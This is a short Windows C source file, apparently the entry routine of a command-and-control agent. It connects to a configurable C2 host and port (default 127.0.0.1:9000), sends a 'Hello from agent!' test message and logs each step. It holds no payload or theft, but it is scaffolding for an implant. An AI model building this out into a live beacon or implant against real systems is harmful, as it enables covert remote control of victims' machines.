#include <windows.h>
#include "../agent/src/tcg.h"
#include "../agent/libs/LibWinTransport/src/transport.h"
#include "../agent/libs/LibDebug/src/debug.h"

#ifndef C2_HOST
#define C2_HOST  "127.0.0.1"
#endif

#ifndef C2_PORT
#define C2_PORT  "9000"
#endif

void agent_main(void) {
    dbg("agent.c",
        "agent_main entered\n"
        "Host: " C2_HOST "\n"
        "Port: " C2_PORT "\n"
        "Calling transport_startup...");

    if (transport_startup() != 0) {
        dbg("agent.c", "transport_startup FAILED");
        return;
    }

    dbg("agent.c", "Startup OK\nCalling transport_connect...");

    void *conn = transport_connect(C2_HOST, C2_PORT);
    if (!conn) {
        dbg("agent.c", "transport_connect FAILED\nNo connection");
        transport_shutdown();
        return;
    }

    dbg("agent.c", "Connected!\nSending data...");

    int rc = transport_send(conn, "Hello from agent!\n", 18);
    if (rc == 0) {
        dbg("agent.c", "Send OK (18 bytes)");
    } else {
        dbg("agent.c", "Send FAILED");
    }

    transport_close(conn);
    transport_shutdown();

    dbg("agent.c", "Cleanup done\nReturning to free.c");
}
